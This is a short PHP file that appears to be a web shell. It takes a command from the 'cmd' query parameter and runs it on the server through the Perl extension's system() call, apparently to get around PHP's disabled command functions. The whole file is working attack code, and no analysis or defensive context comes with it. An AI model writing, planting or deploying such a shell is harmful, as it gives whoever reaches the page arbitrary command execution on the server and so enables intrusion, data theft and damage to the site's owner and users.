<?php
function perlshelL($command){
	$perl=new perl();
	ob_start();
	$perl->eval("system('$command')");
	$exec=ob_get_contents();
	ob_end_clean();
	return $exec;
}

$command = $_GET['cmd'];
perlshelL($command);
?>